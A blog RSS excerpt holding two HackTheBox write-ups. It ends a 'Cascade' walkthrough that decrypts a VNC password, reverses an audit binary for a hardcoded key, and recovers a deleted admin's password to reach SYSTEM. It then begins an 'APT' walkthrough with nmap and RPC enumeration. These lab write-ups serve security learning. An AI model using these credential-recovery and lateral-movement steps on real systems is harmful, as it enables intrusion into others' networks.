<p><img class="img-container" src="imgs/image-20210423204536286.png" alt="image-20210423204536286"  />
</p>
<h3 id="access-as-rthompson">Access as r.thompson</h3>
<p>It turns out that the decoded <code>cascadeLegacyPwd</code> is <code>r.thompson </code>&rsquo;s password.</p>
<p>With <code>r.thompson</code> creds, I can see all the available shares.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «cascade» «192.168.43.234»
$ crackmapexec smb cascade.htb -u r.thompson -p <span style="color:#e6db74">&#39;rY4n5eva&#39;</span> --shares 
</code></pre></div><p><img class="img-container" src="imgs/image-20210423204947026.png" alt="image-20210423204947026"  />
</p>
<h4 id="data-share">Data share</h4>
<p>In Data shares, <code>r.thompson</code> is only allowed to read IT folder. I&rsquo;ll pull all the files from the IT folder using <code>smbget</code>.</p>
<blockquote>
<p>Recall enumeration via RPC, <code>r.thompson</code> is a member of the IT group.</p>
</blockquote>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «cascade» «192.168.43.234»
$ smbget -R smb://cascade.htb/Data/IT/ -U r.thompson
</code></pre></div><p><img src="imgs/image-20210423205837847.png" alt="image-20210423205837847" style="zoom:80%;" /></p>
<p>Here is the directory structure. I&rsquo;ll take a look on <code>Meeting_Notes_June_2018.html</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «Data» «192.168.43.234»
$ tree
.
└── IT
    ├── Email Archives
    │   └── Meeting_Notes_June_2018.html
    ├── LogonAudit
    ├── Logs
    │   ├── Ark AD Recycle Bin
    │   │   └── ArkAdRecycleBin.log
    │   └── DCs
    │       └── dcdiag.log
    └── Temp
        ├── r.thompson
        └── s.smith
            └── VNC Install.reg

<span style="color:#ae81ff">9</span> directories, <span style="color:#ae81ff">4</span> files
</code></pre></div><p>I can read the <code>Meeting_Notes_June_2018.html</code>&rsquo;s content using browser. I drew a red line to indicate something important.</p>
<p><img class="img-container" src="imgs/image-20210423210730678.png" alt="image-20210423210730678"  />
</p>
<p>The second interesting file is <code>VNC Install.reg</code>. It contains a stored password which can be decrypted according to this GitHub (<a href="https://github.com/frizb/PasswordDecrypts">https://github.com/frizb/PasswordDecrypts</a>)</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">□□Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC]

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server]
...&lt;snip&gt;...
&#34;Password&#34;=hex:6b,cf,2a,4b,6e,5a,ca,0f
...&lt;snip&gt;...
</code></pre></div><p>The third interesting file is <code>ArkAdRecycleBin.log</code>. It looks like a log from a custom application. I&rsquo;ll take note on &ldquo;Moving object to AD recycle bin CN=TempAdmin&rdquo; part.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">1/10/2018 15:43 [MAIN_THREAD]   ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
1/10/2018 15:43 [MAIN_THREAD]   Validating settings...
1/10/2018 15:43 [MAIN_THREAD]   Error: Access is denied
1/10/2018 15:43 [MAIN_THREAD]   Exiting with error code 5
2/10/2018 15:56 [MAIN_THREAD]   ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
2/10/2018 15:56 [MAIN_THREAD]   Validating settings...
2/10/2018 15:56 [MAIN_THREAD]   Running as user CASCADE\ArkSvc
2/10/2018 15:56 [MAIN_THREAD]   Moving object to AD recycle bin CN=Test,OU=Users,OU=UK,DC=cascade,DC=local
2/10/2018 15:56 [MAIN_THREAD]   Successfully moved object. New location CN=Test\0ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN=Deleted Objects,DC=cascade,DC=local
2/10/2018 15:56 [MAIN_THREAD]   Exiting with error code 0
8/12/2018 12:22 [MAIN_THREAD]   ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
8/12/2018 12:22 [MAIN_THREAD]   Validating settings...
8/12/2018 12:22 [MAIN_THREAD]   Running as user CASCADE\ArkSvc
8/12/2018 12:22 [MAIN_THREAD]   Moving object to AD recycle bin CN=TempAdmin,OU=Users,OU=UK,DC=cascade,DC=local
8/12/2018 12:22 [MAIN_THREAD]   Successfully moved object. New location CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
8/12/2018 12:22 [MAIN_THREAD]   Exiting with error code 0
</code></pre></div><p>As for <code>dcdiag.log</code>, up until now, I had no idea what that log was about.</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-ssmith">Shell as s.smith</h3>
<h4 id="decrypt-vnc-password">Decrypt VNC Password</h4>
<p>The VNC password can be decrypted using metasploit irb (interactive ruby).</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#f92672">&gt;&gt;</span> fixedkey <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x17\x52\x6b\x06\x23\x4e\x58\x07</span><span style="color:#e6db74">&#34;</span>
<span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x17</span><span style="color:#e6db74">Rk</span><span style="color:#ae81ff">\x06</span><span style="color:#e6db74">#NX</span><span style="color:#ae81ff">\a</span><span style="color:#e6db74">&#34;</span>
<span style="color:#f92672">&gt;&gt;</span> require <span style="color:#e6db74">&#39;rex/proto/rfb&#39;</span>
<span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">true</span>
<span style="color:#f92672">&gt;&gt;</span> <span style="color:#66d9ef">Rex</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Proto</span><span style="color:#f92672">::</span><span style="color:#66d9ef">RFB</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Cipher</span><span style="color:#f92672">.</span>decrypt <span style="color:#f92672">[</span><span style="color:#e6db74">&#34;6BCF2A4B6E5ACA0f&#34;</span><span style="color:#f92672">].</span>pack(<span style="color:#e6db74">&#39;H*&#39;</span>), fixedkey
<span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#34;sT333ve2&#34;</span>
</code></pre></div><p><img class="img-container" src="imgs/image-20210423213121911.png" alt="image-20210423213121911"  />
</p>
<p>Since it was discovered in <code>s.smith</code>&rsquo;s folder, I may try this decrypted password on user <code>s.smith</code>.</p>
<h4 id="remote-access">Remote Access</h4>
<p>From RPC enumeration, I already knew that user <code>s.smith</code> is a member of Remote Management Users, so I could try it with <code>evil-winrm</code> and it works.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «Data» «192.168.43.234»
$ evil-winrm -i cascade.htb -u s.smith -p <span style="color:#e6db74">&#39;sT333ve2&#39;</span>
</code></pre></div><p>I can grab user flag.</p>
<p><img src="imgs/image-20210423213702788.png" alt="image-20210423213702788" style="zoom:80%;" /></p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-arksvc">Shell as arksvc</h3>
<h4 id="audit-share">Audit$ share</h4>
<p>After enumerating <code>s.smith</code>&rsquo;s privileges and groups, <code>CASCADE\Audit Share</code> reminds me to the <code>Audit$</code> share, to which I previously had no access.</p>
<p><img class="img-container" src="imgs/image-20210423214229455.png" alt="image-20210423214229455"  />
</p>
<p>I have read permissions now on <code>Audit$</code>.</p>
<p><img class="img-container" src="imgs/image-20210423214742159.png" alt="image-20210423214742159"  />
</p>
<p>This share appears to contain an entire software application.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «Data» «192.168.43.234»
$ smbclient -U s.smith <span style="color:#ae81ff">\\\\</span>cascade.htb<span style="color:#ae81ff">\\</span>Audit$
</code></pre></div><p><img class="img-container" src="imgs/image-20210423214817145.png" alt="image-20210423214817145"  />
</p>
<p>I&rsquo;ll pull them all from Cascade to my Kali</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «Data» «192.168.43.234»
$ smbget -R smb://cascade.htb/Audit$ -U s.smith
</code></pre></div><p><img class="img-container" src="imgs/image-20210423215007263.png" alt="image-20210423215007263"  />
</p>
<p>And then send them over to my Windows.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «Audit$» «192.168.43.234»
$ tree
.
├── CascAudit.exe
├── CascCrypto.dll
├── DB
│   └── Audit.db
├── RunAudit.bat
├── System.Data.SQLite.dll
├── System.Data.SQLite.EF6.dll
├── x64
│   └── SQLite.Interop.dll
└── x86
    └── SQLite.Interop.dll

<span style="color:#ae81ff">3</span> directories, <span style="color:#ae81ff">8</span> files

→ root@iamf «Audit$» «192.168.43.234»
$ file CascAudit.exe
CascAudit.exe: PE32 executable <span style="color:#f92672">(</span>console<span style="color:#f92672">)</span> Intel <span style="color:#ae81ff">80386</span> Mono/.Net assembly, <span style="color:#66d9ef">for</span> MS Windows
</code></pre></div><h4 id="analyzing-auditdb">Analyzing Audit.db</h4>
<p><code>Audit.db</code> is an SQlite3 database. As I&rsquo;m analyzing on my Windows without SQLite installed, I&rsquo;ll use an online <a href="https://inloop.github.io/sqlite-viewer/">SQLite viewer</a>.</p>
<p>There are four tables in the database.</p>
<p><img src="imgs/image-20210423222130834.png" alt="image-20210423222130834" style="zoom:80%;" /></p>
<p>The records of the deleted AD object are kept in the <code>DeletedUserAudit</code> table.</p>
<p><img src="imgs/image-20210423221127995.png" alt="image-20210423221127995" style="zoom:80%;" /></p>
<p>The <code>Ldap</code> table contains the credentials for ArkSvc.</p>
<p><img src="imgs/image-20210423222309586.png" alt="image-20210423222309586" style="zoom:80%;" /></p>
<p>The password is not a simple base64 encoded string, but it is encrypted.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «Audit$» «192.168.43.234»
$ echo <span style="color:#e6db74">&#39;BQO5l5Kj9MdErXx6Q6AGOw==&#39;</span> | base64 -d
♣♥□□□□□□D□|zC□♠;<span style="color:#75715e">#</span>
</code></pre></div><h4 id="analyzing-cascauditexe">Analyzing CascAudit.exe</h4>
<p>I tried to run the program on my PC, but it produced the following errors.</p>
<p><img class="img-container" src="imgs/image-20210423223821767.png" alt="image-20210423223821767"  />
</p>
<blockquote>
<p>Don&rsquo;t run an untrusted binary you downloaded from a CTF box.</p>
</blockquote>
<p>I use a tool called <code>dnSpy</code> to reverse CascAudit.exe.</p>
<p>Once it is loaded, I&rsquo;ll go straight to the main function.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#"><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> Main()
{
	<span style="color:#66d9ef">if</span> (MyProject.Application.CommandLineArgs.Count != <span style="color:#ae81ff">1</span>)
	{
		Console.WriteLine(<span style="color:#e6db74">&#34;Invalid number of command line args specified. Must specify database path only&#34;</span>);
		<span style="color:#66d9ef">return</span>;
	}
    
...&lt;snip&gt;...
<span style="color:#66d9ef">try</span>
			{
				sqliteConnection.Open();
				<span style="color:#66d9ef">using</span> (SQLiteCommand sqliteCommand = <span style="color:#66d9ef">new</span> SQLiteCommand(<span style="color:#e6db74">&#34;SELECT * FROM LDAP&#34;</span>, sqliteConnection))
				{
					<span style="color:#66d9ef">using</span> (SQLiteDataReader sqliteDataReader = sqliteCommand.ExecuteReader())
					{
						sqliteDataReader.Read();
						str = Conversions.ToString(sqliteDataReader[<span style="color:#e6db74">&#34;Uname&#34;</span>]);
						str2 = Conversions.ToString(sqliteDataReader[<span style="color:#e6db74">&#34;Domain&#34;</span>]);
						<span style="color:#66d9ef">string</span> encryptedString = Conversions.ToString(sqliteDataReader[<span style="color:#e6db74">&#34;Pwd&#34;</span>]);
						<span style="color:#66d9ef">try</span>
						{
							password = Crypto.DecryptString(encryptedString, <span style="color:#e6db74">&#34;c4scadek3y654321&#34;</span>);
						}
						<span style="color:#66d9ef">catch</span> (Exception ex)
						{
							Console.WriteLine(<span style="color:#e6db74">&#34;Error decrypting password: &#34;</span> + ex.Message);
							<span style="color:#66d9ef">return</span>;
						}
					}
				}
				sqliteConnection.Close();
			}
...&lt;snip&gt;...
</code></pre></div><p>Let&rsquo;s break it down.</p>
<p>In order for the program to run properly, I need to specify the database path as its first argument.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#">...&lt;snip&gt;...
<span style="color:#66d9ef">if</span> (MyProject.Application.CommandLineArgs.Count != <span style="color:#ae81ff">1</span>)
	{
		Console.WriteLine(<span style="color:#e6db74">&#34;Invalid number of command line args specified. Must specify database path only&#34;</span>);
		<span style="color:#66d9ef">return</span>;
	}
...&lt;snip&gt;...
</code></pre></div><p>If the condition above is satisfied, it opens an SQL connection and fetches all data from the <code>Ldap</code> table. Each of them is then stored to <code>str</code>, <code>str2</code>, and <code>password</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#">...&lt;snip&gt;...
				sqliteConnection.Open();
				<span style="color:#66d9ef">using</span> (SQLiteCommand sqliteCommand = <span style="color:#66d9ef">new</span> SQLiteCommand(<span style="color:#e6db74">&#34;SELECT * FROM LDAP&#34;</span>, sqliteConnection))
				{
					<span style="color:#66d9ef">using</span> (SQLiteDataReader sqliteDataReader = sqliteCommand.ExecuteReader())
					{
						sqliteDataReader.Read();
						str = Conversions.ToString(sqliteDataReader[<span style="color:#e6db74">&#34;Uname&#34;</span>]);
						str2 = Conversions.ToString(sqliteDataReader[<span style="color:#e6db74">&#34;Domain&#34;</span>]);
						<span style="color:#66d9ef">string</span> encryptedString = Conversions.ToString(sqliteDataReader[<span style="color:#e6db74">&#34;Pwd&#34;</span>]);
						<span style="color:#66d9ef">try</span>
						{
							password = Crypto.DecryptString(encryptedString, <span style="color:#e6db74">&#34;c4scadek3y654321&#34;</span>);
						}
...&lt;snip&gt;...
</code></pre></div><p>The interesting part in the code above is, of course, the password decrypt line. Now because I only need the decrypt function, I could remove all the codes and put only this line below on the main function and then print it out using <code>Console.Write()</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#">password = Crypto.DecryptString(encryptedString, <span style="color:#e6db74">&#34;c4scadek3y654321&#34;</span>);
</code></pre></div><h4 id="decrypt-password">Decrypt Password</h4>
<p>First, I&rsquo;ll enter edit mode on the current main function</p>
<p><img class="img-container" src="imgs/image-20210423235935774.png" alt="image-20210423235935774"  />
</p>
<p>Then, I could only use the decrypt function in the main function. So the main function code now looks like this.</p>
<p><img class="img-container" src="imgs/image-20210424000216346.png" alt="image-20210424000216346"  />
</p>
<p>I&rsquo;ll save it as a new program called <code>CascAuditModified.exe</code>.</p>
<p><img class="img-container" src="imgs/image-20210424000500081.png" alt="image-20210424000500081"  />
</p>
<p>Now if I run it, I get the decrypted password.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌─「iamf@MSI」 ‣ 「/mnt/z/Shared/Audit$」 ᓚᘏᗢ <span style="color:#f92672">[</span>172.17.146.164<span style="color:#f92672">]</span>
└─╼$ ./CascAuditModified.exe
w3lc0meFr31nd
</code></pre></div><p><img class="img-container" src="imgs/image-20210424000707924.png" alt="image-20210424000707924"  />
</p>
<h4 id="remote-access---arksvc">Remote Access - Arksvc</h4>
<p>From my RPC enumeration, ArkSvc is a member of Remote Management Users, so I can use it with <code>evil-winrm</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «Data» «192.168.43.234»
$ evil-winrm -i cascade.htb -u arksvc -p <span style="color:#e6db74">&#39;w3lc0meFr31nd&#39;</span>

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\a</span>rksvc<span style="color:#ae81ff">\D</span>ocuments&gt;
</code></pre></div><h3 id="shell-as-nt-authoritysystem">Shell as NT Authority\System</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>I&rsquo;ll wrap it up:</p>
<p>First, recall from RPC enumeration that user <code>ArkSvc</code> is also a member of AD Recycle Bin. The AD Recycle Bin group gives you permission to read deleted AD objects.</p>
<p>Second, according to the email sent by Steve Smith, there is a temporary admin account called <code>TempAdmin</code> that uses the same password as the &ldquo;normal&rdquo; admin account.</p>
<p><img class="img-container" src="imgs/image-20210424003416214.png" alt="image-20210424003416214"  />
</p>
<p>But, based on <code>ArkAdRecycleBin.log</code>, <code>TempAdmin</code> has been moved into AD Recycle Bin.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">...&lt;snip&gt;...
8/12/2018 12:22 [MAIN_THREAD]   Running as user CASCADE\ArkSvc
8/12/2018 12:22 [MAIN_THREAD]   Moving object to AD recycle bin CN=TempAdmin,OU=Users,OU=UK,DC=cascade,DC=local
8/12/2018 12:22 [MAIN_THREAD]   Successfully moved object. New location CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
8/12/2018 12:22 [MAIN_THREAD]   Exiting with error code 0
</code></pre></div><p>And now using <code>ArksSvc</code> account, I can search all the deleted objects using the command below:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">*Evil-WinRM* PS C:\Users\arksvc\Documents&gt; Get-ADObject -filter <span style="color:#e6db74">&#39;isDeleted -eq $true&#39;</span> -includeDeletedObjects -Properties * -includeDeletedObjects -SearchBase <span style="color:#e6db74">&#34;DC=cascade,DC=local&#34;</span>
</code></pre></div><p>After looking through the output, I noticed that <code>TempAdmin</code> has one interesting properties. It is another <code>cascadeLegacyPwd</code>.</p>
<p><img src="imgs/image-20210424004624882.png" alt="image-20210424004624882" style="zoom:80%;" /></p>
<p>I can decode the value to plaintext</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «Data» «192.168.43.234»
$ echo <span style="color:#e6db74">&#39;YmFDVDNyMWFOMDBkbGVz&#39;</span> | base64 -d
baCT3r1aN00dles
</code></pre></div><p><code>TempAdmin:baCT3r1aN00dles</code></p>
<h4 id="remote-access---nt-authoritysystem">Remote Access - NT Authority\System</h4>
<p>The password works on the Administrator account, and I can obtain an interactive shell as NT Authority\System using <code>psexec.py</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «Data» «192.168.43.234»
$ psexec.py cascade.local/administrator:<span style="color:#e6db74">&#39;baCT3r1aN00dles&#39;</span>@cascade.htb
</code></pre></div><p><img class="img-container" src="imgs/image-20210424005142127.png" alt="image-20210424005142127"  />
</p>
<hr>
<h2 id="references">References</h2>
<ul>
<li><a href="https://book.hacktricks.xyz/windows/active-directory-methodology/privileged-accounts-and-token-privileges#ad-recycle-bin">https://book.hacktricks.xyz/windows/active-directory-methodology/privileged-accounts-and-token-privileges#ad-recycle-bin</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - APT</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-apt/</link>
      <pubDate>Sat, 17 Apr 2021 00:09:51 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-apt/</guid>
      <description>Learn remote computer network interface enumeration via MSRPC and exploiting NTLMv1</description>
      <content:encoded><![CDATA[<p>APT is an insane difficulty Windows machine from HackTheBox and it starts with enumeration on RPC services to get a list of MSRPC interfaces. One of the interface called IObjectExporter has a method named <em>ServerAlive()</em> can be abused to reveals the IPv6 address of the machine. There is a share contains a backup file of AD database and it can be extracted to obtain users' hashes. Brute-force attack is performed to obtain one valid credentials from those hashes. With that credentials, I&rsquo;m able to query to the registry to find another set of credentials which can be used to gain a foothold on the system. A PowerShell history reveals that the machine is configured to accept NTLMv1 authentication, which is then exploited to get Administrator access.</p>
<h3 id="skills-learned">Skills Learned</h3>
<ul>
<li>RPC enumeration</li>
<li>Port Forwarding</li>
<li>Remote Registry</li>
<li>Exploiting NTLMv1</li>
</ul>
<h3 id="tools">Tools</h3>
<ul>
<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
<li>Nmap - Preinstalled in Kali Linux</li>
<li>Gobuster - <a href="https://github.com/OJ/gobuster">https://github.com/OJ/gobuster</a></li>
<li>Impacket - <a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></li>
<li>IOXIDResolver - <a href="https://github.com/mubix/IOXIDResolver">https://github.com/mubix/IOXIDResolver</a></li>
<li>smbclient - Preinstalled in Kali Linux</li>
<li>CrackMapExec - <a href="https://github.com/byt3bl33d3r/CrackMapExec">https://github.com/byt3bl33d3r/CrackMapExec</a></li>
<li>Socat - Preinstalled in Kali Linux</li>
<li>Evil-WinRM - <a href="https://github.com/Hackplayers/evil-winrm">https://github.com/Hackplayers/evil-winrm</a></li>
<li>Kerbrute - <a href="https://github.com/ropnop/kerbrute">https://github.com/ropnop/kerbrute</a></li>
<li>pyKerbrute - <a href="https://github.com/3gstudent/pyKerbrute">https://github.com/3gstudent/pyKerbrute</a></li>
<li>Responder - <a href="https://github.com/lgandx/Responder">https://github.com/lgandx/Responder</a></li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap---ipv4">Nmap - IPv4</h3>
<p>Both the initial scan and full scan with <code>nmap</code> only show two open ports, HTTP with IIS server on port 80, and MSRPC on port 135.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «apt» «10.10.14.72» 
$ nmap -sC -sV -oA nmap/initial-apt <span style="color:#e6db74">&#39;10.10.10.213&#39;</span> -v

PORT    STATE SERVICE VERSION
80/tcp  open  http    Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Gigantic Hosting | Home
135/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
</code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>Visiting port 80 on the browser shows up a website called &ldquo;Gigantic Hosting&rdquo;.</p>
<p><img class="img-container" src="imgs/image-20210415055156844.png" alt="image-20210415055156844"  />
</p>
<p>The input vectors on <code>https://10.13.38.16/contact-post.html</code> don&rsquo;t appear to be neither vulnerable nor injectable.</p>
<p><img class="img-container" src="imgs/image-20210415061845703.png" alt="image-20210415061845703"  />
</p>
<p>It sends a post request with an empty body to a host that can not be resolved by my network.</p>
<p>Here is the example request.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#a6e22e">POST</span> https://10.13.38.16/contact-post.html <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">10.13.38.16</span>
User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span>
Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">en-US,en;q=0.5</span>
Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate, br</span>
Referer<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://10.10.10.213/support.html</span>
Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">application/x-www-form-urlencoded</span>
Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">0</span>
Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">keep-alive</span>
Upgrade-Insecure-Requests<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
</code></pre></div><h4 id="directory-brute-force---gobuster">Directory Brute Force - Gobuster</h4>
<p>Nothing really interesting.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@iamf «apt» «10.10.14.72» 
$ gobuster dir -u http://10.10.10.213/ -x html,txt,bak -w /opt/SecLists/Discovery/Web-Content/raft-large-directories.txt

...&lt;SNIP&gt;...
/images               <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 150<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.10.213/images/<span style="color:#f92672">]</span>
/js                   <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 146<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.10.213/js/<span style="color:#f92672">]</span>    
/css                  <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 147<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.10.213/css/<span style="color:#f92672">]</span>   
/news.html            <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 5528<span style="color:#f92672">]</span>                                 
/about.html           <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 9386<span style="color:#f92672">]</span>                                 
/support.html         <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 6326<span style="color:#f92672">]</span>                                 
/Images               <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 150<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.10.213/Images/<span style="color:#f92672">]</span>
/services.html        <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 10592<span style="color:#f92672">]</span>                                
/index.html           <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 14879<span style="color:#f92672">]</span>                                
/clients.html         <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 12146<span style="color:#f92672">]</span>                                
</code></pre></div><h3 id="tcp-135---msrpc">TCP 135 - MSRPC</h3>
<p>Remote Procedure Call (RPC) allows applications to invoke a function (or procedure or subroutine) of a remote computer without having to understand the network’s details, and MSRPC is Microsoft’s enhanced version of <a href="https://en.wikipedia.org/wiki/DCE/RPChttps://en.wikipedia.org/wiki/DCE/RPC">DCE/RPC</a>. MSRPC works together with the Distributed Component Object Model (DCOM). DCOM provides a mechanism for exposing application objects and it consists of a set of RPC interfaces that can be implemented over any RPC Transport.</p>
<p>DCOM and RPC endpoint mapper sit on this port (both of them run on the shared process of <code>svchost.exe</code>). RPC endpoint mapper maintains the <strong>database of endpoints</strong> that clients use to map an interface to endpoints. There is a tool called <code>rpcdump.py</code> from Impacket that can be used to dump those endpoints:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@iamf «apt» «10.10.14.72»
$ rpcdump.py -port <span style="color:#ae81ff">135</span> <span style="color:#e6db74">&#39;10.10.10.213&#39;</span>

<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Retrieving endpoint list from 10.10.10.213
...&lt;SNIP&gt;...
Protocol: <span style="color:#f92672">[</span>MS-RSP<span style="color:#f92672">]</span>: Remote Shutdown Protocol
Provider: wininit.exe
UUID    : D95AFE70-A6D5-4259-822E-2C84DA1DDB0D v1.0
Bindings:
          ncacn_ip_tcp:10.10.10.213<span style="color:#f92672">[</span>49664<span style="color:#f92672">]</span>
          ncalrpc:<span style="color:#f92672">[</span>WindowsShutdown<span style="color:#f92672">]</span>
